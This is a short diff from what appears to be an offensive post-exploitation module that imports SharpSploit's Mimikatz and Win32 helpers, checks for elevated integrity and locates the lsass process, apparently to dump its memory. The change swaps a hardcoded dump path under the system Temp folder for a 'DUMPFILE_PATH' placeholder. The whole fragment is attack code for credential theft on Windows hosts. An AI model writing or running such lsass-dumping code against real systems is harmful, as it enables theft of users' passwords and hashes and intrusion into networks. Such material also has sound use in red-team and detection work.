@@ -43,8 +43,7 @@ if IsHighIntegrity():
     from SharpSploit import Mimikatz
     from SharpSploit import Win32
 
-    systemRoot = Environment.GetEnvironmentVariable("SystemRoot")
-    dumpFile = "{0}\\Temp\\debug.bin".format(systemRoot)
+    dumpFile = "DUMPFILE_PATH"
 
     targetProcess = Process.GetProcessesByName("lsass")[0]
     targetProcessId = targetProcess.Id
